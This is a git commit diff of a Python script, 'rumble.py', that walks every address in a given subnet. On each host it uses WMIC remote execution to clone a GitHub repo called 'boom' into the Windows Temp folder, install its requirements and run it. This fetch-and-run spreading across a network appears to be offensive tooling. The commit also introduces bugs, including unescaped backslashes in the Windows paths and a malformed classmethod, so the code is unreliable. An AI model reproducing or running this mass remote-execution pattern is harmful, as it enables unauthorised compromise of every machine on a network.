8996d409ca240a71677d13af075134a1e95ce971
Dr. Pasta <pastaphd@gmail.com>
2022-01-24 22:02:23 -0500

    minor changes

--- rumble.py
+++ rumble.py
@@ -1,19 +1,19 @@
 from os import system
 from argparse import ArgumentParser
-from ipaddress import IPv4Address
+from ipaddress import IPv4Network
 from threading import Thread
 from time import sleep
 
 class Rumble:
     def __init__(self):
         self.args = ArgumentParser()
-        self.args.add_arguements('target', help="Subnet in CIDR notation to deploy to", type=str)
+        self.args.add_argument('target', help="Subnet in CIDR notation to deploy to", type=str)
         self.args = self.args.parse_args()
 
         self.deploy()
     
     def deploy(self):
-        for ip in IPv4Address(self.args.target):
+        for ip in IPv4Network(self.args.target):
             last = self.Boom(ip)
             last.start()
         last.join()
@@ -24,11 +24,11 @@ class Rumble:
             self.ip = ip
         
         def run(self):
-            self.wmic('git clone https://github.com/drpasta/boom.git c:\\Windows\\Temp\\boom\\')
+            self.wmic('git clone https://github.com/drpasta/boom.git c:\Windows\Temp\boom')
             sleep(8)
-            self.wmic('pip install -r c:\\Windows\\Temp\\boom\\requirements.txt')
+            self.wmic('pip install -r c:\Windows\Temp\boom\requirements.txt')
             sleep(8)
-            self.wmic('python c:\\Windows\\Temp\\boom\\boom.py')
+            self.wmic('python c:\Windows\Temp\boom\boom.py')
         
         @classmethod 
         def wmic(ip, command):
